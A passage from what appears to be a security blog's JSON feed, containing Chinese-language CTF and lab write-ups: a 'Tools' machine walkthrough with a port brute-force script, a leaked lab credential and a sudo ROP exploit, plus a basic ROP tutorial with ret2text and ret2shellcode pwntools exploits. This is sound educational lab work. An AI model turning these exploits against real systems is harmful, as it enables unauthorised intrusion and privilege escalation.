thrilled to announce a momentous milestone in our journey together. With immense joy and gratitude, we celebrate the achievement of reaching 2 million remarkable users! This incredible feat would not have been possible without each and every one of you.\n\nFrom the very beginning, HackTheBox has been built upon the belief that knowledge sharing, collaboration, and hands-on experience are fundamental to personal and professional growth. Together, we have fostered an environment where innovation thrives and skills are honed. Each challenge completed, each machine conquered, and every skill learned has contributed to the collective intelligence that fuels this vibrant community.\n\nTo each and every member of the HackTheBox community, thank you for being a part of this incredible journey. Your contributions have shaped the very fabric of our platform and inspired us to continually innovate and evolve. We are immensely proud of what we have accomplished together, and we eagerly anticipate the countless milestones yet to come.\n\nHere's to the next chapter, where we will continue to push the boundaries of cybersecurity, inspire the next generation of ethical hackers, and create a world where knowledge is accessible to all.\n\nWith deepest gratitude,\n\nThe HackTheBox Team\n```",
            "url": "https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion",
            "title": "HackTheBox - Machine - TwoMillion",
            "summary": "Machine TwoMillion https://app.hackthebox.com/machines/TwoMillion | Linux | Eas Recon è®¿é—® HTTP æœåŠ¡ï¼Œé‡‡é›†æŒ‡çº¹ï¼Œæ˜¯ä»‹ç» HackTheBox ç½‘ç«™ æœ‰ä¸€ä¸ªç™»å½•é¡µ æ³¨å†Œéœ€è¦æ‹¿åˆ°é‚€è¯·ç  é€šè¿‡ç›®å½•æ‰«æèƒ½æ‰«æåˆ°å¦å¤–ä¸€...",
            "date_modified": "2025-06-21T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linux",
                "FUZZ",
                "CVE-2023-0386"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/16/ç¾¤Ué¶æœºTools",
            "content_html": "\n# Tools\n\n## Recon\n\nç«¯å£æ‰«æ\n\n```bash\nâœ  ~ nmap -sT -min-rate 5000 192.168.56.82\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 15:51 CST\nNmap scan report for 192.168.56.82\nHost is up (0.00058s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:43:CC:F4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.24 seconds\n```\n\n## çˆ†ç ´ 1337\n\nè®¿é—®`80`ç«¯å£æç¤º\n\n![image.png](/post-images/ç¾¤Ué¶æœºTools/image.png)\n\n`1337` ç«¯å£æ˜¯è¦æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆ\n\n```bash\nâœ  ~ nc 192.168.56.82 1337\nPlease input [152]: 152\nPlease input [921]: 921\nPlease input [441]: 441\nPlease input [105]: 105\nPlease input [534]: 534\nPlease input [192]: 192\nPlease input [626]: 626\nPlease input [968]: 968\nPlease input [674]: 674\nPlease input [494]: 494\nPlease input [768]: 768\nPlease input [808]: 808\nPlease input [365]: 365\nPlease input [438]: 438\nPlease input [975]: 975\nPlease input [165]: 165\nPlease input [796]: 796\nPlease input [892]:\n```\n\n`AI` è„šæœ¬ç›´æ¥çˆ†ç ´\n\n```bash\nimport socket\nimport re\nimport time\n\n# --- é…ç½® ---\nHOST = '192.168.56.82'  # ç›®æ ‡æœåŠ¡å™¨ IP åœ°å€\nPORT = 1337  # ç›®æ ‡æœåŠ¡å™¨ç«¯å£\n# ------------\n\n# æ­£åˆ™è¡¨è¾¾å¼ï¼Œç”¨äºä»æ–‡æœ¬ä¸­æå–æ–¹æ‹¬å·å†…çš„æ•°å­—\npattern = re.compile(r\"\\[(\\d+)\\]\")\n\n# å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œä»socketä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°é‡åˆ°ç‰¹å®šçš„åˆ†éš”ç¬¦\ndef read_until(sock, delimiter):\n    \"\"\"ä» sock ä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°æ¥æ”¶åˆ° delimiter ä¸ºæ­¢\"\"\"\n    data = b\"\"\n    while not data.endswith(delimiter):\n        try:\n            # ä¸€æ¬¡åªè¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œé¿å…è¯»å–è¿‡å¤šå†…å®¹\n            chunk = sock.recv(1)\n            if not chunk:  # å¦‚æœè¿æ¥å…³é—­ï¼Œrecvä¼šè¿”å›ç©ºå­—èŠ‚ä¸²\n                return data  # è¿”å›å·²æ¥æ”¶çš„æ•°æ®\n            data += chunk\n        except socket.timeout:\n            # å¦‚æœå‘ç”Ÿè¶…æ—¶ï¼Œä¹Ÿè¿”å›å·²æ¥æ”¶çš„æ•°æ®\n            print(\"\\n[!] è¯»å–è¶…æ—¶\")\n            return data\n    return data\n\ntry:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        # è®¾ç½®ä¸€ä¸ªè¶…æ—¶ï¼Œé˜²æ­¢è„šæœ¬åœ¨ä»»ä½•recvæ“ä½œä¸Šæ°¸ä¹…å¡ä½\n        s.settimeout(3)\n        print(f\"[*] è¿æ¥åˆ° {HOST}:{PORT}...\")\n        s.connect((HOST, PORT))\n        print(\"[+] è¿æ¥æˆåŠŸï¼\")\n\n        while True:\n            # è¯»å–æœåŠ¡å™¨çš„æç¤ºï¼Œç›´åˆ° \": \" å‡ºç°\n            # æˆ‘ä»¬ç”¨ b': ' æ˜¯å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²\n            prompt_bytes = read_until(s, b': ')\n\n            # å¦‚æœè¯»å–åˆ°çš„æ•°æ®ä¸ºç©ºï¼Œè¯´æ˜è¿æ¥å¯èƒ½å·²æ–­å¼€\n            if not prompt_bytes:\n                print(\"\\n[*] è¿æ¥å·²å…³é—­ã€‚\")\n                break\n\n            # å°†å­—èŠ‚è§£ç ä¸ºå­—ç¬¦ä¸²ä»¥ä¾¿å¤„ç†\n            prompt_str = prompt_bytes.decode('utf-8')\n            print(f\"[<] æ”¶åˆ°: {prompt_str}\", end='')  # ç”¨ end='' é¿å…æ‰“å°å¤šä½™çš„æ¢è¡Œ\n\n            # åœ¨æ”¶åˆ°çš„æç¤ºä¸­æŸ¥æ‰¾æ•°å­—\n            match = pattern.search(prompt_str)\n\n            if match:\n                # æå–æ•°å­—\n                number_to_send = match.group(1)\n\n                # å‡†å¤‡è¦å‘é€çš„æ•°æ®ï¼ˆæ•°å­— + æ¢è¡Œç¬¦ï¼‰\n                response = (number_to_send + '\\n').encode('utf-8')\n\n                print(f\" [>] å‘é€: {number_to_send}\")  # åœ¨åŒä¸€è¡Œæ‰“å°å‘é€å†…å®¹\n\n                # å‘é€å“åº”\n                s.sendall(response)\n\n                # çŸ­æš‚å»¶è¿Ÿï¼Œæœ‰æ—¶å¯ä»¥é¿å…ç«æ€æ¡ä»¶\n                time.sleep(0.1)\n            else:\n                # å¦‚æœåœ¨æç¤ºä¸­æ²¡æœ‰æ‰¾åˆ°æ•°å­—ï¼Œè¯´æ˜æŒ‘æˆ˜ç»“æŸäº†\n                print(\"\\n\\n[*] æœªæ‰¾åˆ°æŒ‘æˆ˜æ•°å­—ï¼Œå‡å®šæŒ‘æˆ˜å·²å®Œæˆã€‚\")\n                print(\"[*] æœåŠ¡å™¨æœ€ç»ˆå“åº”ï¼š\")\n                print(\"====================================\")\n                print(prompt_str.strip())  # æ‰“å°æˆ‘ä»¬å·²æ”¶åˆ°çš„éƒ¨åˆ†\n\n                # å°è¯•å†å¤šæ¥æ”¶ä¸€äº›æ•°æ®ï¼Œå› ä¸ºflagå¯èƒ½è·Ÿåœ¨åé¢\n                try:\n                    final_data = s.recv(4096).decode('utf-8').strip()\n                    if final_data:\n                        print(final_data)\n                except socket.timeout:\n                    pass  # æ²¡æœ‰æ›´å¤šæ•°æ®æ˜¯æ­£å¸¸çš„\n\n                print(\"====================================\")\n                break\n\nexcept ConnectionRefusedError:\n    print(f\"[!] è¿æ¥è¢«æ‹’ç»ã€‚è¯·æ£€æŸ¥ IP ({HOST}) å’Œç«¯å£ ({PORT})ã€‚\")\nexcept socket.timeout:\n    print(\"[!] è¿æ¥è¶…æ—¶ã€‚æœåŠ¡å™¨æ²¡æœ‰åœ¨è§„å®šæ—¶é—´å†…å“åº”ã€‚\")\nexcept Exception as e:\n    print(f\"[!] å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}\")\n\nprint(\"[*] è„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚\")\n\n```\n\nå¾—åˆ°å‡­æ® `welcome`:`learnpwntools`\n\n```bash\n[<] æ”¶åˆ°: Please input [407]:  [>] å‘é€: 407\n[<] æ”¶åˆ°: Please input [510]:  [>] å‘é€: 510\n[<] æ”¶åˆ°: user/pass:welcome/learnpwntools\n```\n\n## ç¼“å†²åŒºæº¢å‡º\n\næŸ¥çœ‹ `sudo` æƒé™\n\n```bash\nwelcome@Tools:~$ sudo -l\nMatching Defaults entries for welcome on Tools:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on Tools:\n    (ALL) NOPASSWD: /opt/find_backdoor\n```\n\nè¿è¡Œï¼Œå‘ç°ä¼šæœ‰ `Segmentation fault`\n\n```bash\nwelcome@Tools:~$ /opt/find_backdoor       \nplease input                                      \n111111111111111111111111111                                                                                       \nok,bye!!!111111111111111111111111111                                                                              \nok,bye!!!                                                                                                         \nSegmentation fault \n```\n\næ‹‰å‡ºæ¥åç¼–è¯‘ä¸€çœ‹å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´\n\n![image.png](/post-images/ç¾¤Ué¶æœºTools/image1.png)\n\næŸ¥çœ‹å®‰å…¨æœºåˆ¶ï¼Œè£¸å¥”\n\n```bash\nwelcome@Tools:~$ file /opt/find_backdoor \n/opt/find_backdoor: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped\nwelcome@Tools:~$ checksec /opt/find_backdoor \n[*] '/opt/find_backdoor'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x400000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    Stripped:   No\n```\n\n`shift+F12`æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå­˜åœ¨ `/bin/sh`\n\n![image.png](/post-images/ç¾¤Ué¶æœºTools/image2.png)\n\næŸ¥çœ‹ `plt` ï¼Œæœ‰`system`å‡½æ•°ï¼Œå¯ä»¥ç›´æ¥ç”¨\n\n```bash\npwndbg> plt\nSection .plt 0x401020 - 0x401060:\n0x401030: puts@plt\n0x401040: system@plt\n0x401050: gets@plt\n```\n\næœ‰ `system` å’Œ `/bin/sh` ï¼Œç›´æ¥æ¢­å“ˆ\n\nè®¡ç®—åç§»å€¼ï¼Œå¾—åˆ°`23`\n\n```bash\nâœ  ttt /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n```\n\n```bash\npwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n```\n\n```bash\n(pwn) âœ  ttt /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 23\n```\n\næ‹¿ä¸€ä¸‹éœ€è¦ç”¨åˆ°çš„åœ°å€\n\n```bash\nwelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --string \"/bin/sh\"\nStrings information\n============================================================\n0x000000000040201b : /bin/sh\n```\n\n```\nwelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only \"pop|ret\"\nGadgets information\n============================================================\n0x00000000004011fb : pop rdi ; ret\n```\n\n```bash\nwelcome@Tools:~$ ROPgadget --binary /opt/find_backdoor --only \"pop|ret\"\nGadgets information\n============================================================\n0x0000000000401016 : ret\n```\n\nç¼–å†™åˆ©ç”¨è„šæœ¬\n\n```bash\nfrom pwn import *\nr = ssh(host='192.168.56.82', user='welcome', password='learnpwntools')\np = r.process(['sudo', '/opt/find_backdoor']) \nsystem_addr = 0x401040\nbin_sh_addr = 0x000000000040201b\npop_rdi_addr = 0x00000000004011fb\nret = 0x0000000000401016\n\npayload = b'A' * 23 + p64(ret) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendlineafter(b'please input',payload)\np.interactive()\n```\n\n```bash\n    IBT:      Disabled\n[+] Starting remote process None on 192.168.56.82: pid 1105\n[!] ASLR is disabled for '/opt/find_backdoor'!\n[*] Switching to interactive mode\n\nAAAAAAAAAAAAAAAAAAAAAAA\\x16\\x10@\nok,bye!!!\n$ $ whoami\nwelcome\n```\n\n![image.png](/post-images/ç¾¤Ué¶æœºTools/image3.png)\n\n![image.png](/post-images/ç¾¤Ué¶æœºTools/image4.png)",
            "url": "https://www.sunsetaction.top/2025/06/16/ç¾¤Ué¶æœºTools",
            "title": "ç¾¤Ué¶æœº - Tools",
            "summary": "Tools Recon ç«¯å£æ‰«æ çˆ†ç ´ 1337 è®¿é—®80ç«¯å£æç¤º 1337 ç«¯å£æ˜¯è¦æˆ‘ä»¬è¾“å…¥ä»€ä¹ˆ AI è„šæœ¬ç›´æ¥çˆ†ç ´ å¾—åˆ°å‡­æ® welcome:learnpwntools ç¼“å†²åŒºæº¢å‡º æŸ¥çœ‹ sudo æƒé™ è¿è¡Œï¼Œå‘ç°ä¼šæœ‰ Segmentation fault æ‹‰å‡ºæ¥åç¼–è¯‘ä¸€çœ‹å­˜åœ¨ç¼“å­˜åŒºæº¢å‡ºæ¼æ´ æŸ¥...",
            "date_modified": "2025-06-16T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "PWN",
                "ROP",
                "ret2text",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/15/PWN - åŸºæœ¬ROP",
            "content_html": "\n# PWN - åŸºæœ¬ROP\n\n> https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/\n> \n\nè¿™é‡Œç”¨åˆ°çš„æ‰€æœ‰é¢˜ç›®ï¼šhttps://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/\n\n`HackTheBox - Ellingson` ç¢°åˆ°ç¼“å†²åŒºæº¢å‡ºï¼Œæ— ä»ä¸‹æ‰‹ï¼Œæ•…æœ‰æ­¤ç¯‡\n\n## ret2text\n\n`ret2text` å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (å³ï¼ŒÂ `.text`Â æ®µä¸­çš„ä»£ç )Â \n\næ”¶æŸ¥çœ‹ç¨‹åºä¿æŠ¤æœºåˆ¶\n\n```bash\nâœ  ret2text checksec ret2text          \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\nä»…ä»…å¼€å¯`NX` ï¼Œå¹¶ä¸”æ˜¯ `32` ä½ç¨‹åº\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image.png)\n\n`gets`å‡½æ•°ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”æ²¡æœ‰åšè¾¹ç•Œä¿æŠ¤\n\nå¹¶ä¸”`secure`å‡½æ•°ä¸­æœ‰ `/bin/sh` \n\n```bash\nvoid secure()\n{\n  unsigned int v0; // eax\n  int input; // [esp+18h] [ebp-10h] BYREF\n  int secretcode; // [esp+1Ch] [ebp-Ch]\n\n  v0 = time(0);\n  srand(v0);\n  secretcode = rand();\n  __isoc99_scanf(&unk_8048760, &input);\n  if ( input == secretcode )\n    system(\"/bin/sh\");\n}\n```\n\nå®šä½`system`å‡½æ•°\n\n```bash\npwndbg> disas secure\nDump of assembler code for function secure:\n   0x080485fd <+0>:     push   ebp\n   0x080485fe <+1>:     mov    ebp,esp\n   0x08048600 <+3>:     sub    esp,0x28\n   0x08048603 <+6>:     mov    DWORD PTR [esp],0x0\n   0x0804860a <+13>:    call   0x8048470 <time@plt>\n   0x0804860f <+18>:    mov    DWORD PTR [esp],eax\n   0x08048612 <+21>:    call   0x80484b0 <srand@plt>\n   0x08048617 <+26>:    call   0x80484e0 <rand@plt>\n   0x0804861c <+31>:    mov    DWORD PTR [ebp-0xc],eax\n   0x0804861f <+34>:    lea    eax,[ebp-0x10]\n   0x08048622 <+37>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048626 <+41>:    mov    DWORD PTR [esp],0x8048760\n   0x0804862d <+48>:    call   0x80484f0 <__isoc99_scanf@plt>\n   0x08048632 <+53>:    mov    eax,DWORD PTR [ebp-0x10]\n   0x08048635 <+56>:    cmp    eax,DWORD PTR [ebp-0xc]\n   0x08048638 <+59>:    jne    0x8048646 <secure+73>\n   0x0804863a <+61>:    mov    DWORD PTR [esp],0x8048763\n   0x08048641 <+68>:    call   0x8048490 <system@plt>\n   0x08048646 <+73>:    leave\n   0x08048647 <+74>:    ret\nEnd of assembler dump.\n```\n\nåœ¨`0x0804863a`å¤„\n\næ¥ä¸‹æ¥è®¡ç®—åç§»é‡ï¼Œä½¿ç”¨ `pwndbg`\n\nåç¼–è¯‘`main`æ‰¾åˆ°`gets` `0x080486ae`\n\n```bash\npwndbg> disas main\nDump of assembler code for function main:\n   0x08048648 <+0>:     push   ebp\n   0x08048649 <+1>:     mov    ebp,esp\n   0x0804864b <+3>:     and    esp,0xfffffff0\n   0x0804864e <+6>:     add    esp,0xffffff80\n   0x08048651 <+9>:     mov    eax,ds:0x804a060\n   0x08048656 <+14>:    mov    DWORD PTR [esp+0xc],0x0\n   0x0804865e <+22>:    mov    DWORD PTR [esp+0x8],0x2\n   0x08048666 <+30>:    mov    DWORD PTR [esp+0x4],0x0\n   0x0804866e <+38>:    mov    DWORD PTR [esp],eax\n   0x08048671 <+41>:    call   0x80484d0 <setvbuf@plt>\n   0x08048676 <+46>:    mov    eax,ds:0x804a040\n   0x0804867b <+51>:    mov    DWORD PTR [esp+0xc],0x0\n   0x08048683 <+59>:    mov    DWORD PTR [esp+0x8],0x1\n   0x0804868b <+67>:    mov    DWORD PTR [esp+0x4],0x0\n   0x08048693 <+75>:    mov    DWORD PTR [esp],eax\n   0x08048696 <+78>:    call   0x80484d0 <setvbuf@plt>\n   0x0804869b <+83>:    mov    DWORD PTR [esp],0x804876c\n   0x080486a2 <+90>:    call   0x8048480 <puts@plt>\n   0x080486a7 <+95>:    lea    eax,[esp+0x1c]\n   0x080486ab <+99>:    mov    DWORD PTR [esp],eax\n   0x080486ae <+102>:   call   0x8048460 <gets@plt>\n   0x080486b3 <+107>:   mov    DWORD PTR [esp],0x80487a4\n   0x080486ba <+114>:   call   0x8048450 <printf@plt>\n   0x080486bf <+119>:   mov    eax,0x0\n   0x080486c4 <+124>:   leave\n   0x080486c5 <+125>:   ret\nEnd of assembler dump.\n```\n\nåœ¨`gets`å¤„è®¾ç½®æ–­ç‚¹\n\n```bash\npwndbg> b *0x080486ae\nBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.\n```\n\n`run`ç„¶åè§‚å¯Ÿæ ˆå¸§\n\n```bash\npwndbg> run                 \nStarting program: /root/Desktop/Test/StackBufferOverFlow/ret2text/ret2text \nwarning: Unable to find libthread_db matching inferior''s thread library, thread debugging will not be available.\nThere is something amazing here, do you know anything?\n                                                         \nBreakpoint 1, 0x080486ae in main () at ret2text.c:24\nwarning: 24     ret2text.c: No such file or directory\nWarning: Avoided exploring possible address 0xfffdade8.                                                                                                                                                                             \nYou can explicitly explore it with `vmmap-explore 0xfffda000`\nLEGEND: STACK | HEAP | CODE | DATA | WX | RODATA\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n EAX  0xffffcfac â—‚â€” 0   \n EBX  0xf7f9ae14 â—‚â€” 0x232d0c /* '\\x0c-#' */                                                                                                                                                                                         \n ECX  0xf7f9c8e0 â—‚â€” 0\n EDX  0\n EDI  0xf7ffcb60 (_rtld_global_ro) â—‚â€” 0\n ESI  0x80486d0 (__libc_csu_init) â—‚â€” push ebp\n EBP  0xffffd018 â—‚â€” 0\n ESP  0xffffcf90 â€”â–¸ 0xffffcfac â—‚â€” 0\n EIP  0x80486ae (main+102) â€”â–¸ 0xfffdade8 â—‚â€” 0xfffdade8\n```\n\nå¯ä»¥çœ‹åˆ°`EBP` =`0xffffd018` ï¼Œ`ESP` =`0xffffcfa`\n\n```bash\npwndbg> p/d 0xffffd018 - 0xffffcfac\n$1 = 108\n```\n\nç¼–å†™`exp`  \n\n```bash\n(pwn) âœ  ret2text cat exp.py\nfrom pwn import *\n\nsh = process('./ret2text')\ntarget = 0x0804863a\npayload = b'A' * 112 + p32(target)\nsh.sendline(payload)\nsh.interactive()\n```\n\n```bash\n(pwn) âœ  ret2text python exp.py\n[+] Starting local process './ret2text': pid 3343\n[*] Switching to interactive mode\nThere is something amazing here, do you know anything?\nMaybe I will tell you next time !$ whoami\nroot\n$  \n```\n\n## **ret2shellcode**\n\n`ret2shellcode`ï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œ `shellcode` ä»£ç ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œshellcode éœ€è¦æˆ‘ä»¬è‡ªè¡Œç¼–å†™ï¼Œå³æ­¤æ—¶æˆ‘ä»¬éœ€è¦è‡ªè¡Œå‘å†…å­˜ä¸­å¡«å……ä¸€äº›å¯æ‰§è¡Œçš„ä»£ç ã€‚\næŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œæœªå¼€å¯ä»»ä½•ä¿æŠ¤\n\n```bash\nâœ  ret2shellcode checksec ret2shellcode \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2shellcode/ret2shellcode'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x8048000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\nä¾æ—§æ˜¯`gets` ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image1.png)\n\nä½†æ˜¯è¿™æ¬¡å¹¶æ²¡æœ‰å…¶ä»–å‡½æ•°ï¼Œä¹Ÿæ²¡æœ‰ `/bin/sh` çš„èº«å½±\n\nè¿™é‡Œä½¿ç”¨`strncpy`å°†`s`ä¼ é€’åˆ°`buf2`\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image2.png)\n\næˆ‘ä»¬è°ƒè¯•ä¸€ä¸‹ç¨‹åºï¼ŒæŸ¥çœ‹`bss`åŒºåŸŸæ˜¯å¦æ‹¥æœ‰è¯»å†™æƒé™\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image3.png)\n\n```bash\n 0x804a000  0x804b000 rw-p     1000   1000 ret2shellcode\n```\n\né‚£ä¹ˆæ€è·¯å°±æ˜¯ï¼š`shellcode +ï¼ˆåç§»å€¼ - len(shellcode)ï¼‰* A  + buf2add`\n\nè®¡ç®—åç§»é‡\n\né¦–å…ˆç”Ÿæˆ`200`é•¿åº¦ä½†æ˜¯æ¯ä¸€æ®µéƒ½æ˜¯å”¯ä¸€çš„å­—ç¬¦\n\n```bash\npwndbg> cyclic 200\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n```\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image4.png)\n\nè¿”å›åœ°å€è¢«`daab` è¦†ç›–ä¸Šå»äº†ï¼Œå†è®¡ç®—åç§»é‡\n\n```bash\npwndbg> cyclic -l daab\nFinding cyclic pattern of 4 bytes: b'daab' (hex: 0x64616162)\nFound at offset 112\n```\n\nåç§»é‡å’Œ`buf2`åœ°å€æˆ‘ä»¬éƒ½çŸ¥é“äº†ï¼Œç›´æ¥ç¼–å†™`payload`\n\n```bash\nfrom pwn import *\nshellcode = asm(shellcraft.sh())\nshellcode_pad = shellcode + (112 - (len(shellcode))) * b'A'\nbuf2_add = 0x804a080\nsh = process('./ret2shellcode')\nsh.sendline(shellcode_pad + p32(buf2_add))\nsh.interactive()\n```\n\n```bash\nroot@sunset-virtual-machine:~# python3 exp.py \n[+] Starting local process './ret2shellcode': pid 58718\n[*] Switching to interactive mode\nNo system for you this time !!!\nbye bye ~$ id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n## **ret2syscall**\n\n`ret2syscall`ï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– `shell`ã€‚\n\næŸ¥çœ‹ç¨‹åºï¼Œ`32`ä½ï¼Œé™æ€ç¨‹åºï¼Œæ²¡æœ‰ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“\n\n```bash\nâœ  ret2syscall file ret2syscall \nret2syscall: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, with debug_info, not stripped\n```\n\næŸ¥çœ‹ä¿æŠ¤æœºåˆ¶ï¼Œæ ˆä¸å¯æ‰§è¡Œï¼Œæ— æ³•ä½¿ç”¨`ret2shellcode`\n\n```bash\nâœ  ret2syscall checksec ret2syscall            \n[*] '/root/Desktop/Test/StackBufferOverFlow/ret2syscall/ret2syscall'\n    Arch:       i386-32-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x8048000)\n    Stripped:   No\n    Debuginfo:  Yes\n```\n\nè¿™é‡Œè¿˜æ¶‰åŠåˆ°ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€èˆ¬æˆ‘ä»¬é€šè¿‡ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨æ¥è·å¾—`shell`\n\n```bash\nexecve(\"/bin/sh\",NULL,NULL)\n```\n\nå½“é‡åˆ°`32`ä½ç¨‹åºæ—¶ï¼Œéœ€è¦ä½¿å¾—ï¼š\n\n- ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ eax åº”è¯¥ä¸º `0xb`ï¼ˆ`0xb` ä¸º `execve` å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼‰ä¹Ÿå°±æ˜¯`11`\n- ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ ebx åº”è¯¥æŒ‡å‘ `/bin/sh` çš„åœ°å€ï¼Œå…¶å®æ‰§è¡Œ sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚\n- ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ ecx åº”è¯¥ä¸º `0`\n- ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º `0`\n\næœ€åå°†ç³»ç»Ÿè°ƒç”¨å’Œå‚æ•°éƒ½å¡«å…¥å¯„å­˜å™¨åï¼Œæˆ‘ä»¬å†è®©ç³»ç»Ÿè§¦å‘ `0x80` å·ä¸­æ–­ï¼ˆ`int 0x80`ï¼‰\n\n`Linux`å¯¹ç³»ç»Ÿè°ƒç”¨çš„è°ƒç”¨å¿…é¡»é€šè¿‡æ‰§è¡Œ`int $0x80`æ±‡ç¼–æŒ‡ä»¤ï¼Œè¿™æ¡æŒ‡ä»¤ä¼šäº§ç”Ÿå‘é‡ä¸º`128`çš„ç¼–ç¨‹å¼‚å¸¸\n\nIDA åç¼–è¯‘ç¨‹åºï¼Œä¾æ—§æ˜¯`gets` ï¼Œå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´\n\n![image.png](/post-images/PWN%20-%20åŸºæœ¬ROP/image5.png)\n\n`shift` + `F12` 